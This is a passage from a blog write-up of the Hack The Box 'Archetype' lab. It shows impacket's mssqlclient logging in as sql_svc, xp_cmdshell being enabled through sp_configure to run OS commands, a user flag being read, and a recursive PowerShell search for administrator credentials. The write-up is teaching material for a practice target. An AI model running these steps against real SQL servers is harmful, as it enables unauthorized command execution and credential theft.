style="color:#393A34">=</span><span class="token plain"> ms_sql.login</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">options.db, username, password, domain, options.hashes, options.windows_auth</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"/usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket/tds.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">917</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    tls.do_handshake</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"/usr/lib/python3/dist-packages/OpenSSL/SSL.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">1915</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> do_handshake</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    self._raise_ssl_error</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self._ssl, result</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"/usr/lib/python3/dist-packages/OpenSSL/SSL.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">1647</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> _raise_ssl_error</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    _raise_current_error</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"/usr/lib/python3/dist-packages/OpenSSL/_util.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">54</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> exception_from_error_queue</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    raise exception_type</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">errors</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OpenSSL.SSL.Error: </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'SSL routines'</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">'state_machine'</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">'internal error'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'SSL routines'</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">'state_machine'</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">'internal error'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>From the stacktrace, the issue is caused by a problem in the SSL handshake pointing to the OpenSSL library.
Doing some research, I found that <a href="https://github.com/SecureAuthCorp/impacket/issues/856" target="_blank" rel="noopener noreferrer">this problem</a> also happened to other people and someone had found <a href="https://github.com/SecureAuthCorp/impacket/issues/856#issuecomment-729880208" target="_blank" rel="noopener noreferrer">a solution by modifying the TLS version from v1 to v2</a>. I performed the same changes in the <code>~/.local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket/tds.py</code> and reran the same command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mssqlclient.py </span><span class="token variable" style="color:#36acaa">$username</span><span class="token builtin class-name">:</span><span class="token variable" style="color:#36acaa">$password</span><span class="token plain">@</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-debug</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.9.22 - Copyright </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain"> SecureAuth Corporation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Encryption required, switching to TLS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ERROR</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ARCHETYPE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Line </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: Login failed </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> user </span><span class="token string" style="color:#e3116c">'sql_svc'</span><span class="token builtin class-name">.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This time around I got a different error message, a failed login with the user <code>sql_svc</code>. I found a way around that by specifying the <code>-windows-auth</code> flag which enables using <a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver15#connecting-through-windows-authentication" target="_blank" rel="noopener noreferrer">Kerberos\Windows authentication</a>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mssqlclient.py </span><span class="token variable" style="color:#36acaa">$username</span><span class="token builtin class-name">:</span><span class="token variable" style="color:#36acaa">$password</span><span class="token plain">@</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> -windows-auth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.9.22 - Copyright </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain"> SecureAuth Corporation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Encryption required, switching to TLS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ENVCHANGE</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">DATABASE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Old Value: master, New Value: master</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ENVCHANGE</span><span class="token punctuation" style="color:#393A34">(</span><span class="token environment constant" style="color:#36acaa">LANGUAGE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Old Value: , New Value: us_english</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ENVCHANGE</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">PACKETSIZE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Old Value: </span><span class="token number" style="color:#36acaa">4096</span><span class="token plain">, New Value: </span><span class="token number" style="color:#36acaa">16192</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> INFO</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ARCHETYPE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Line </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: Changed database context to </span><span class="token string" style="color:#e3116c">'master'</span><span class="token builtin class-name">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> INFO</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ARCHETYPE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Line </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: Changed language setting to us_english.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ACK: Result: </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> - Microsoft SQL Server </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">140</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3232</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token operator" style="color:#393A34">!</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Press </span><span class="token builtin class-name">help</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> extra shell commands</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I had an SQL shell! But I was lost at this point. I had no idea what to do from here as I have very limited knowledge using SQL Server administration aside from writing queries and creating database resources. I had to take a step back to review and research this.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="running-system-commands-from-sql-server-shell">Running System Commands from SQL Server Shell<a href="https://kbbgl.github.io/blog/hack-the-box-archetype-challenge#running-system-commands-from-sql-server-shell" class="hash-link" aria-label="Direct link to Running System Commands from SQL Server Shell" title="Direct link to Running System Commands from SQL Server Shell">​</a></h2>
<p>Reading through official Microsoft documentation, I found that we can actually <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" target="_blank" rel="noopener noreferrer">run system commands from within SQL Server using the <code>xp_cmdshell</code></a>. This is exactly what I was looking for as it enabled me to be able to interact with the remote target system. When I attempted to run this cmdlet, I received the following error:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> xp_cmdshell </span><span class="token string" style="color:#e3116c">"echo test"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> ERROR</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ARCHETYPE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Line </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: SQL Server blocked access to procedure </span><span class="token string" style="color:#e3116c">'sys.xp_cmdshell'</span><span class="token plain"> of component </span><span class="token string" style="color:#e3116c">'xp_cmdshell'</span><span class="token plain"> because this component is turned off as part of the security configuration </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> this server. A system administrator can </span><span class="token builtin class-name">enable</span><span class="token plain"> the use of </span><span class="token string" style="color:#e3116c">'xp_cmdshell'</span><span class="token plain"> by using sp_configure. For </span><span class="token function" style="color:#d73a49">more</span><span class="token plain"> information about enabling </span><span class="token string" style="color:#e3116c">'xp_cmdshell'</span><span class="token plain">, search </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'xp_cmdshell'</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> SQL Server Books Online.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Seems that we need to enable the use of the command somehow. Reading the <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15#remarks" target="_blank" rel="noopener noreferrer">Microsoft documentation</a> in greater depth, I found that the cmdlet is disabled by default. It also gave me the information I needed in order to enable it:</p>
<blockquote>
<p><code>xp_cmdshell</code> is a very powerful feature and disabled by default. <code>xp_cmdshell</code> can be enabled and disabled by using the Policy-Based Management or by executing <code>sp_configure</code>. For more information, see <a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration?view=sql-server-ver15" target="_blank" rel="noopener noreferrer">Surface Area Configuration</a> and <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15" target="_blank" rel="noopener noreferrer"><code>xp_cmdshell</code> Server Configuration Option</a>.</p>
</blockquote>
<p>I ran the following command to enable it:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sp_configure </span><span class="token string" style="color:#e3116c">'xp_cmdshell'</span><span class="token plain">, </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> INFO</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ARCHETYPE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Line </span><span class="token number" style="color:#36acaa">185</span><span class="token plain">: Configuration option </span><span class="token string" style="color:#e3116c">'xp_cmdshell'</span><span class="token plain"> changed from </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> to </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">. Run the RECONFIGURE statement to install.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I then ran <code>reconfigure</code> as requested. I was now able to run any commands on the machine.
Since I speak a little bit of Batch, I ran a command to see which directory we’re currently in:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> xp_cmdshell </span><span class="token string" style="color:#e3116c">"echo The current directory is %CD%"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output                                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------------------------------------------------------------------------------   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The current directory is C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">system32                                       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output                                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------------------------------------------------------------------------------   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">archetype</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">sql_svc </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Looks like the user we’re currently logged in with <code>sql_svc</code> who can run remote commands on the system. So now all that is left is to read the contents of the user flag in the desktop:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> xp_cmdshell </span><span class="token string" style="color:#e3116c">"type c:\Users\sql_svc\Desktop\user.txt"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output                                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------------------------------------------------------------------------------   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3e7b102e78218e935bf3f4951fec21a3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I was delighted at this point. But still had my eyes to the second and more challenging part: retrieve the administrator’s flag.
I attempted to access the path where the flag is located but unfortunately I could not access it:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SQL</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> xp_cmdshell </span><span class="token string" style="color:#e3116c">"cd c:\Users\Administrator\Desktop"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output                                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------------------------------------------------------------------------------   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Access is denied.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I decided, since I had access to the C: drive, it was worth to do a recursive search in the drive to see if we can find the word “administrator” in some file (since we know that only the administrator account can access the flag on its desktop):
I spawned a new PowerShell process and ran the following command only to be stopped because of denial to search in a particular path (The Event Viewer logs):</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SQL&gt;xp_cmdshell </span><span class="token string" style="color:#e3116c">"powershell "</span><span class="token function" style="color:#d73a49">Get-ChildItem</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Recurse </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Select-String</span><span class="token plain"> administrator </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">List </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Select</span><span class="token plain"> Path</span><span class="token string" style="color:#e3116c">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Select-String</span><span class="token plain"> : The file C:\Windows\system32\winevt\Logs\Windows PowerShell</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">evtx cannot be read: Access to the path    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">'C:\Windows\system32\winevt\Logs\Windows PowerShell.evtx'</span><span class="token plain"> is denied</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">               </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">At line:1 char:26                                                                  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Get-ChildItem</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Recurse </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Select-String</span><span class="token plain"> administrator </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">List </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Select</span><span class="token plain"> P </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token plain">                          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> CategoryInfo          : InvalidArgument: </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">:</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">[Select-String]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ArgumentException   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> FullyQualifiedErrorId : ProcessingFile</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">Microsoft</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">PowerShell</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Commands</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">SelectStringCommand   </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I altered the command a bit and added the flag <code>-ErrorAction SilentlyContinue</code> to prevent the script from from stopping. Let me break down each part to explain what it’s intended to do.
The first part retrieves all files and directories from the <code>sql_svc</code> home folder recursively. <a href="https://superuser.com/questions/150748/have-powershell-get-childitem-return-files-only" target="_blank" rel="noopener noreferrer">The <code>-File</code> flag ensures the cmdlet only returns files. The <code>-Force</code> flag is important here because it searches for all files (even hidden ones)</a>:</p>
